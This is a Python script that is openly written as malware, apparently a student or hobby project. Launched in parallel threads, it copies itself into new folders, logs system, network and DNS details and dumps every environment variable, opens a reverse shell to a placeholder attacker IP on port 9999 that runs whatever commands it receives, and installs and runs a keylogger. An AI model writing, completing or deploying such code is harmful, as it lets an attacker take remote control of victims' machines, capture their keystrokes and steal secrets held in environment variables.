from sys import argv
import os
import sys
import platform
import socket
import subprocess
from datetime import datetime
import shutil
import shlex
import threading


def reproduce():
    script = argv
    name = str(script[0])

    for i in range(0, 2):
        directoryName = "desktoop" + str(i)
        subprocess.call(["mkdir", directoryName])
        subprocess.call(["cp", name, directoryName])





def Windows_or_Linux():
    try:
        # Get the path of the running script
        script_path = os.path.abspath(sys.argv[0])

        # Choose clone directory (user-writable)
        if platform.system() == "Windows":
            clone_dir = os.path.join(os.environ["USERPROFILE"], "love")
        else:
            clone_dir = os.path.expanduser("~/love")

        os.makedirs(clone_dir, exist_ok=True)


        shutil.copy(script_path, clone_dir)

    except Exception:
        pass





def information():
    LOG_FILE = "system_info.txt"


    def get_local_ip():
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))  # no packets sent
            ip = s.getsockname()[0]
            s.close()
            return ip
        except Exception:
            return "Unknown"

    def log(title, content, f):
        f.write(f"\n=== {title} ===\n")
        f.write(content.strip() + "\n")

    with open(LOG_FILE, "w", encoding="utf-8") as f:
        f.write("SYSTEM INFORMATION LOG\n")
        f.write(f"Timestamp: {datetime.now()}\n")

        #BASIC SYSTEM INFO
        log("OS", platform.platform(), f)
        log("System", platform.system(), f)
        log("Release", platform.release(), f)
        log("Machine", platform.machine(), f)
        log("Processor", platform.processor(), f)
        log("Python Version", sys.version, f)
        log("User", os.getenv("USER") or os.getenv("USERNAME") or "Unknown", f)
        log("Hostname", socket.gethostname(), f)
        log("Script Path", os.path.abspath(sys.argv[0]), f)

        # ----- NETWORK INFO -----
        log("Local IP", get_local_ip(), f)

        try:
            if sys.platform.startswith("win"):
                net = subprocess.check_output(
                    ["ipconfig", "/all"],
                    stderr=subprocess.DEVNULL,
                    text=True
                )
            else:
                net = subprocess.check_output(
                    ["ip", "addr"],
                    stderr=subprocess.DEVNULL,
                    text=True
                )
            log("Network Interfaces", net, f)
        except Exception as e:
            log("Network Interfaces", f"Error: {e}", f)

        # ----- DNS -----
        try:
            if sys.platform.startswith("win"):
                dns = subprocess.check_output(
                    ["ipconfig", "/all"],
                    stderr=subprocess.DEVNULL,
                    text=True
                )
            else:
                dns = subprocess.check_output(
                    ["cat", "/etc/resolv.conf"],
                    stderr=subprocess.DEVNULL,
                    text=True
                )
            log("DNS", dns, f)
        except Exception as e:
            log("DNS", f"Error: {e}", f)

        # ----- ROUTING -----
        try:
            cmd = ["route", "print"] if sys.platform.startswith("win") else ["ip", "route"]
            routes = subprocess.check_output(cmd, stderr=subprocess.DEVNULL, text=True)
            log("Routing Table", routes, f)
        except Exception as e:
            log("Routing Table", f"Error: {e}", f)

        # ----- ENVIRONMENT -----
        env_dump = "\n".join(f"{k}={v}" for k, v in os.environ.items())
        log("Environment Variables", env_dump, f)

    print(f"[+] System information written to {LOG_FILE}")

def revereseshell():
    host = "Enter your IP"
    port = 9999

    # CREATE SOCKET
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))

    print(s.recv(1024).decode())

    cwd = os.getcwd()   # ← FIXED

    while True:
        cmd = s.recv(1024).decode().strip()
        print(f"[+] received command: {cmd}")

        if cmd.lower() in ['q', 'quit', 'x', 'exit']:
            break

        if cmd.startswith("cd"):
            try:
                path = cmd.split(maxsplit=1)[1]
                os.chdir(path)
                cwd = os.getcwd()
                result = cwd.encode()
            except Exception as e:
                result = str(e).encode()
        else:
            try:
                args = shlex.split(cmd)
                result = subprocess.check_output(
                    args,
                    stderr=subprocess.STDOUT,
                    cwd=cwd
                )
            except subprocess.CalledProcessError as e:
                result = e.output
            except Exception as e:
                result = str(e).encode()

        if not result:
            result = b"[+] Executed"

        s.send(result)

    s.close()


def logger():
    def ensure_pynput():
        try:
            import pynput
        except ImportError:
            subprocess.run(
                [sys.executable, "-m", "pip", "install", "--quiet", "pynput"],
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
                check=False
            )
    ensure_pynput()
    from pynput import keyboard


    def keyPressed(key):
        print(str(key))
        with open("keyfile.txt", 'a') as logKey:
            try:
                char = key.char
                logKey.write(char)
            except:
                print("Error getting char")

    if __name__ == "__main__":
        listener = keyboard.Listener(on_press=keyPressed)
        listener.start()
        input()


r = threading.Thread(target=reproduce)
r1 = threading.Thread(target=Windows_or_Linux)
r2 = threading.Thread(target=information)
r3 = threading.Thread(target=revereseshell)
r4 = threading.Thread(target=logger)

r.start()
r1.start()
r2.start()
r3.start()
r4.start()